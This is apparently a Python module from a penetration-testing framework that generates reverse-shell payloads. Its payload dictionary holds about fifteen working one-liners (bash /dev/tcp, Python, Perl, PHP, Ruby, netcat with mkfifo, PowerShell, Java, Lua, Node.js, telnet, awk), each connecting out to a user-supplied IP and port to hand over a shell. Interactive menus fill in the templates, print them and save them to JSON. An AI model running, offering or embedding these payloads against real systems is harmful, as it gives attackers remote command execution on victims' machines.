"""
Reverse Shell Generator Module for Leegion Framework v2.0

Generates various reverse shell payloads for different platforms and languages

Author: Leegion
Project: Leegion Framework v2.0
Copyright (c) 2025 Leegion. All rights reserved.
"""

import os
import json
from typing import Dict, List, Any, Optional
from core.base_module import BaseModule


class ReverseShellGenerator(BaseModule):
    """Reverse shell payload generator for multiple platforms and languages"""

    def __init__(self, config: Dict[str, Any]):
        super().__init__(config, "Reverse_Shell_Generator")
        self.payloads = self._load_payloads()
        self.output_dir = config.get("output_dir", "./reports/output")

    def _load_payloads(self) -> Dict[str, Dict[str, str]]:
        """Load reverse shell payloads from built-in templates"""
        return {
            "bash": {
                "description": "Bash reverse shell",
                "template": "bash -i >& /dev/tcp/{ip}/{port} 0>&1"
            },
            "python": {
                "description": "Python reverse shell",
                "template": """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'"""
            },
            "python3": {
                "description": "Python3 reverse shell",
                "template": """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'"""
            },
            "perl": {
                "description": "Perl reverse shell",
                "template": """perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"""
            },
            "php": {
                "description": "PHP reverse shell",
                "template": """php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'"""
            },
            "ruby": {
                "description": "Ruby reverse shell",
                "template": """ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
            },
            "nc": {
                "description": "Netcat reverse shell",
                "template": "nc -e /bin/sh {ip} {port}"
            },
            "nc_alt": {
                "description": "Netcat alternative reverse shell",
                "template": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
            },
            "powershell": {
                "description": "PowerShell reverse shell",
                "template": """powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()" """
            },
            "java": {
                "description": "Java reverse shell",
                "template": """r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])
p.waitFor()"""
            },
            "lua": {
                "description": "Lua reverse shell",
                "template": """lua -e "require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');" """
            },
            "nodejs": {
                "description": "Node.js reverse shell",
                "template": """node -e "require('child_process').exec('bash -i >& /dev/tcp/{ip}/{port} 0>&1')" """
            },
            "telnet": {
                "description": "Telnet reverse shell",
                "template": "telnet {ip} {port} | /bin/bash | telnet {ip} {port}"
            },
            "awk": {
                "description": "AWK reverse shell",
                "template": """awk 'BEGIN {{s = "/inet/tcp/0/{ip}/{port}"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}' /dev/null"""
            },
            "gawk": {
                "description": "GAWK reverse shell",
                "template": """gawk 'BEGIN {{s = "/inet/tcp/0/{ip}/{port}"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}' /dev/null"""
            }
        }

    def run(self) -> None:
        """Main execution method for reverse shell generator"""
        self.print_header("REVERSE SHELL GENERATOR")
        
        while True:
            self._display_menu()
            choice = self.get_user_choice([
                "Generate Reverse Shell Payload",
                "List Available Payloads", 
                "Save Payloads to File",
                "Back to Main Menu"
            ])

            if choice == 1:
                self._generate_payload()
            elif choice == 2:
                self._list_payloads()
            elif choice == 3:
                self._save_payloads()
            elif choice == 4:
                break
            else:
                self.print_error("Invalid choice. Please try again.")

    def _display_menu(self) -> None:
        """Display the reverse shell generator menu"""
        print(f"\n\033[96m{'='*50}\033[0m")
        print(f"\033[96m{'REVERSE SHELL GENERATOR'.center(50)}\033[0m")
        print(f"\033[96m{'='*50}\033[0m")
        print(f"\033[93mAvailable payloads: {len(self.payloads)}\033[0m")
        print(f"\033[93mOutput directory: {self.output_dir}\033[0m")

    def _generate_payload(self) -> None:
        """Generate a specific reverse shell payload"""
        # Get target IP
        target_ip = self.get_user_input("Enter target IP address: ", "ip")
        if not target_ip:
            return

        # Get target port
        target_port = self.get_user_input("Enter target port: ", "port")
        if not target_port:
            return

        # Select payload type
        payload_types = list(self.payloads.keys())
        self.print_info("Available payload types:")
        for i, ptype in enumerate(payload_types, 1):
            desc = self.payloads[ptype]["description"]
            print(f"  {i}. {ptype} - {desc}")

        choice = self.get_user_choice(payload_types, "Select payload type: ")
        if not choice:
            return

        selected_type = payload_types[choice - 1]
        payload_template = self.payloads[selected_type]["template"]
        
        # Generate payload
        try:
            payload = payload_template.format(ip=target_ip, port=target_port)
            
            self.print_success(f"Generated {selected_type} reverse shell payload:")
            print(f"\n\033[93m{'='*60}\033[0m")
            print(f"\033[92m{payload}\033[0m")
            print(f"\033[93m{'='*60}\033[0m")
            
            # Save to results
            self.add_result({
                "type": "reverse_shell",
                "payload_type": selected_type,
                "target_ip": target_ip,
                "target_port": target_port,
                "payload": payload,
                "description": self.payloads[selected_type]["description"]
            })
            
        except Exception as e:
            self.print_error(f"Failed to generate payload: {e}")

    def _list_payloads(self) -> None:
        """List all available payload types"""
        self.print_header("AVAILABLE PAYLOAD TYPES")
        
        for i, (ptype, info) in enumerate(self.payloads.items(), 1):
            print(f"\n\033[96m{i}.\033[0m \033[93m{ptype.upper()}\033[0m")
            print(f"   Description: {info['description']}")
            print(f"   Template: {info['template'][:100]}...")

    def _save_payloads(self) -> None:
        """Save generated payloads to file"""
        if not self.results:
            self.print_warning("No payloads generated yet. Generate some payloads first.")
            return

        filename = self.get_user_input("Enter filename (without extension): ")
        if not filename:
            return

        # Ensure output directory exists
        os.makedirs(self.output_dir, exist_ok=True)
        
        filepath = os.path.join(self.output_dir, f"{filename}_reverse_shells.json")
        
        try:
            with open(filepath, 'w') as f:
                json.dump(self.results, f, indent=2)
            
            self.print_success(f"Payloads saved to: {filepath}")
            
        except Exception as e:
            self.print_error(f"Failed to save payloads: {e}")

    def get_payload_by_type(self, payload_type: str, target_ip: str, target_port: str) -> Optional[str]:
        """
        Get a specific payload by type
        
        Args:
            payload_type: Type of payload (bash, python, etc.)
            target_ip: Target IP address
            target_port: Target port
            
        Returns:
            Generated payload string or None if failed
        """
        if payload_type not in self.payloads:
            self.print_error(f"Unknown payload type: {payload_type}")
            return None
            
        try:
            template = self.payloads[payload_type]["template"]
            return template.format(ip=target_ip, port=target_port)
        except Exception as e:
            self.print_error(f"Failed to generate payload: {e}")
            return None

    def get_all_payloads(self, target_ip: str, target_port: str) -> Dict[str, str]:
        """
        Get all payloads for a given target
        
        Args:
            target_ip: Target IP address
            target_port: Target port
            
        Returns:
            Dictionary of payload_type -> payload
        """
        all_payloads = {}
        
        for payload_type in self.payloads:
            payload = self.get_payload_by_type(payload_type, target_ip, target_port)
            if payload:
                all_payloads[payload_type] = payload
                
        return all_payloads 